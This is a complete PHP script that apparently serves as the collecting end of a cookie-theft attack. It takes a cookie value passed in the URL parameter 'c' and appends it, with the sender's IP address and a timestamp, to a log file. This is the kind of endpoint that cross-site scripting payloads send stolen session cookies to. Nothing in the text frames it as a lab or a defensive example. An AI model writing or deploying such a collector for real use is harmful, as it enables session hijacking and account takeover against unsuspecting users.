<?php
$cookie = $_GET['c'] ?? '';
$ip     = $_SERVER['REMOTE_ADDR'] ?? '';
$line   = date('c')." | $ip | $cookie\n";
file_put_contents('cookies.log', $line, FILE_APPEND);
?>
